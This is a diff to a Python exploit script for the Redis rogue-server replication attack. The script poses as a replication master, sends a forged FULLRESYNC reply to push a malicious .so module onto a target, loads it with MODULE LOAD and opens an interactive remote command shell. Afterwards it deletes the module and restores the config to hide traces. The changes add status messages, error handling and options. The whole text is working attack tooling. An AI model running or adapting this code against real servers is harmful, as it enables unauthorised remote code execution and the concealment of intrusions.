@@ -4,7 +4,6 @@ import sys
 from time import sleep
 from optparse import OptionParser
 
-payload = open("exp.so", "rb").read()
 CLRF = "\r\n"
 
 def mk_cmd_arr(arr):
@@ -80,7 +79,7 @@ class RogueServer:
             resp = "+OK" + CLRF
             phase = 2
         elif "PSYNC" in data or "SYNC" in data:
-            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
+            resp = "+FULLRESYNC " + "A"*40 + " 1" + CLRF
             # send incorrect length
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
@@ -105,7 +104,7 @@ def interact(remote):
     try:
         print('\033[36m[**] Change to interact mode...\033[0m')
         while True:
-            cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
+            cmd = input("\033[1;36;40m[<<]\033[0m ").strip()
             if cmd == "exit":
                 return
             r = remote.shell_cmd(cmd)
@@ -118,6 +117,7 @@ def interact(remote):
 def runserver(rhost, rport, passwd, lhost, lport, bind_addr):
     # expolit
     remote = Remote(rhost, rport)
+    print('\033[36m[**] Starting Attack...\033[0m')
 
     # auth 
     if passwd:
@@ -142,6 +142,7 @@ def runserver(rhost, rport, passwd, lhost, lport, bind_addr):
     sleep(1)
 
     # load .so
+    print('\033[36m[**] Load Module & Turn off the Replication...\033[0m')
     remote.do("MODULE LOAD {}".format(eval_dbpath))
     remote.do("SLAVEOF NO ONE")
 
@@ -150,9 +151,12 @@ def runserver(rhost, rport, passwd, lhost, lport, bind_addr):
 
     # clean up
     # restore original config, delete eval .so
+    print('\033[36m[**] Clean Target Server...\033[0m')
     remote.do("CONFIG SET dbfilename {}".format(dbfilename))
     remote.shell_cmd("rm {}".format(eval_dbpath))
     remote.do("MODULE UNLOAD system")
+    print('\033[36m[**] Bye~\033[0m')
+
 
 if __name__ == '__main__':
     parser = OptionParser()
@@ -165,9 +169,11 @@ if __name__ == '__main__':
     parser.add_option("--lhost", dest="lh", type="string",
             help="rogue server ip")
     parser.add_option("--lport", dest="lp", type="int",
-            help="rogue server listen port, default 21000", default=21000)
+            help="rogue server listen port, default 21000", default=16666)
     parser.add_option("--bind", dest="bind_addr", type="string", default="0.0.0.0",
             help="rogue server bind ip, default 0.0.0.0")
+    parser.add_option("--so", dest="so_filename", type="string", default="exp.so",
+            help=".so filename, default exp.so")
 
     (options, args) = parser.parse_args()
     if not options.rh or not options.lh:
@@ -175,4 +181,10 @@ if __name__ == '__main__':
     print("TARGET   {}:{}".format(options.rh, options.rp))
     print("ATTACKER {}:{}".format(options.lh, options.lp))
     print("BINDING  {}:{}".format(options.bind_addr, options.lp))
-    runserver(options.rh, options.rp, options.rpasswd, options.lh, options.lp, options.bind_addr)
+    try:
+        payload = open("exp.so", "rb").read()
+        runserver(options.rh, options.rp, options.rpasswd, options.lh, options.lp, options.bind_addr)
+    except Exception as e:
+        print(e)
+        print('\033[31m[!!] Error! Shutdown.\033[0m')
+        exit(1)
